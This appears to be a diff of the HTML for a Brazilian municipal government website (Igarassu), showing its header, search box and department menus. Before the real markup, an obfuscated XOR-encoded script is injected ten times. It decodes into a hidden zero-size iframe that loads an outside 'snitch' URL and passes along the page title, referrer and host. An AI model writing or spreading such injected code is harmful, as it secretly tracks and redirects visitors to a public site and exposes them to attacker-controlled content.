="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+	<div id="top">
+    	<div class="container">
+        	<h1 class="logo"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu" class="ico" title="Prefeitura Municipal de Igarassu | Só mais um site WordPress">Prefeitura Municipal de Igarassu | Só mais um site WordPress</a></h1>
+            <div class="fright">
+            	<ul class="accessibility">
+                	<li><a class="minus ico" href="#" title="Mostrar tamanho menor">Mostrar tamanho menor</a></li>
+                	<li><a class="normal ico" href="#" title="Mostrar tamanho normal">Mostrar tamanho normal</a></li>
+                	<li><a class="plus ico" href="#" title="Mostrar tamanho maior">Mostrar tamanho maior</a></li>
+                </ul>
+                
+                <div class="box-search">
+                	<form method="get" action="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/">
+                    	<input type="text" class="field" name="s" id="s" />
+                        <input type="submit" class="ico submit" value="Pesquisar" />
+                    </form>
+                </div>
+                
+                <ul class="menu">
+                	<li class="one"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu" title="Home"><span class="ico">-</span> Home</a></li>
+                	<li class="two"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/portal-do-servidor" title="Portal do Servidor"><span class="ico">-</span> Portal do Servidor</a></li>
+                	<li class="three"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/fale-conosco" title="Fale Conosco"><span class="ico">-</span> Fale Conosco</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    <div id="menu">
+    	<ul class="container">
+			<li class="one"><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-prefeitura" title="A Prefeitura">A Prefeitura</a>
+            	<div class="submenu-one">
+                	<span class="arrow ico">-</span>
+                	<ul class="submenu">
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-prefeitura/agenda-do-prefeito" title="Agenda do Prefeito">Agenda do Prefeito</a></li>
+						
+						<li><a href="http://www.igarassu.pe.gov.br/listagem-data/17/Licita/E7/F5es" title="Licitações">Licitações</a>
+							                        </li>
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-prefeitura/leis-municipais" title="Leis Municipais">Leis Municipais</a></li>
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-prefeitura/feriados-municipais" title="Feriados Municipais">Feriados Municipais</a></li>
+					</ul>
+                </div>
+            </li>
+			<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-cidade" title="A Cidade">A Cidade</a>
+				<div class="submenu-two">
+                	<span class="arrow ico">-</span>
+                	<ul class="submenu">
+						
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-cidade/conheca-igarassu" title="Conheça Igarassu">Conheça Igarassu</a></li>
+						
+						
+						
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-cidade/perfil-dos-bairros" title="Perfil dos Bairros">Perfil dos Bairros</a></li>
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-cidade/simbolos-oficiais" title="Símbolos Oficiais">Símbolos Oficiais</a></li>
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-cidade/hino-de-igarassu" title="Hino de Igarassu">Hino de Igarassu</a></li>
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/a-cidade/agenda-cultural" title="Agenda Cultural">Agenda Cultural</a></li>
+					</ul>
+                </div>
+            </li>
+			<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/servicos" title="Serviços">Serviços</a>
+				<div class="submenu-three">
+                	<span class="arrow ico">-</span>
+                	<ul class="submenu">
+                        <li><a href="https://www.tinus.com.br/csp/IGARASSU/portal/index.csp?200hsVg8501arDDH73324hQpA8904og=SmqD63Ald029iNN79353stHhX334cSbgv4661V4417545xCJA197" title="Atendimento ao Contribuinte"><span class="ico">-</span> Atendimento ao Contribuinte</a></li>
+                        
+                        <li><a href="https://www.tinus.com.br/csp/IGARASSU/portal/index.csp?200hsVg8501arDDH73324hQpA8904og=SmqD63Ald029iNN79353stHhX334cSbgv4661V4417545xCJA197" title="Declaração de Serviços"><span class="ico">-</span> Declaração de Serviços</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/uploads/2014/05/RELAÇÃO-DE-ESCOLAS-MUNICIPAIS-outubro-2013.doc" title="Escolas Municipais"><span class="ico">-</span> Escolas Municipais</a></li>
+                        <li><a href="http://btechnology.com.br/portal_igarassu/" title="Acompanhamento de Processos"><span class="ico">-</span> Acompanhamento de Processos</a></li>
+                        <li><a href="https://www.tinus.com.br/csp/IGARASSU/portal/index.csp?200hsVg8501arDDH73324hQpA8904og=SmqD63Ald029iNN79353stHhX334cSbgv4661V4417545xCJA197" title="Nota Fiscal Eletrônica"><span class="ico">-</span> Nota Fiscal Eletrônica</a></li>
+                        
+                        
+					</ul>
+                </div>
+            </li>
+			<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos" title="Secretarias e Orgãos">Secretarias e Orgãos</a>
+				<div class="submenu-four">
+                	<span class="arrow ico">-</span>
+                	<ul class="submenu">
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/" title="Secretarias">Secretarias</a>
+						                        <ul class="departments">
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-do-governo/" title="Secretaria do Governo">Secretaria do Governo</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-comercio-e-servicos/" title="Secretaria de Comércio e Serviços">Secretaria de Comércio e Serviços</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-agricultura-e-pesca/" title="Secretaria de Agricultura e Pesca">Secretaria de Agricultura e Pesca</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-servicos-publicos/" title="Secretaria de Serviços Públicos">Secretaria de Serviços Públicos</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-comunicacao/" title="Secretaria de Comunicação">Secretaria de Comunicação</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-do-meio-ambiente/" title="Secretaria do Meio Ambiente">Secretaria do Meio Ambiente</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-da-receita/" title="Secretaria da Receita">Secretaria da Receita</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-certames-publicos/" title="Secretaria de Certames Públicos">Secretaria de Certames Públicos</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-articulacao/" title="Secretaria de Articulação Social">Secretaria de Articulação Social</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-seguranca-cidada/" title="Secretaria de Segurança Cidadã">Secretaria de Segurança Cidadã</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-infraestrutura/" title="Secretaria de Infraestrutura">Secretaria de Infraestrutura</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-do-turismo-cultura-e-esportes/" title="Secretaria de Turismo, Cultura e Esportes">Secretaria de Turismo, Cultura e Esportes</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-do-planejamento/" title="Secretaria do Planejamento">Secretaria do Planejamento</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-da-educacao/" title="Secretaria da Educação">Secretaria da Educação</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-financas/" title="Secretaria de Finanças">Secretaria de Finanças</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-da-saude/" title="Secretaria de Saúde">Secretaria de Saúde</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-da-administracao/" title="Secretaria de Administração">Secretaria de Administração</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-acao-social/" title="Secretaria de Ação Social">Secretaria de Ação Social</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-patrimonio-historico/" title="Secretaria de Patrimônio Histórico">Secretaria de Patrimônio Histórico</a></li>
+                                                </ul>
+                        </li>
+						<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/" title="Orgãos">Orgãos</a>
+						                        <ul class="departments">
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/urbi/" title="URBI">URBI</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/depatran/" title="Depatran">Depatran</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/procon/" title="PROCON">PROCON</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/coordenadoria-da-juventude/" title="Coordenadoria da Juventude">Coordenadoria da Juventude</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/controladoria/" title="Controladoria">Controladoria</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/guarda-municipal/" title="Guarda Municipal">Guarda Municipal</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/procuradoria/" title="Procuradoria">Procuradoria</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/ouvidoria/" title="Ouvidoria">Ouvidoria</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/defesa-civil/" title="Defesa Civil">Defesa Civil</a></li>
+                                                    <li><span class="ico bullet"></span><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/ademig/" title="ADEMIG">ADEMIG</a></li>
+                                                </ul>
+                        </li>
+
+					</ul>
+                </div>
+            </li>
+			<li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/comunicacao/noticias" title="Comunicação">Comunicação</a>
+				<div class="submenu-five">
+                	<span class="arrow ico">-</span>
+                	<ul class="submenu">
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/comunicacao/fotos" title="Fotos"><span class="ico">-</span> Fotos</a></li>
+                        <li><a href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/comunicacao/noticias" title="Notícias"><span class="ico">-</span> Notícias</a></li>
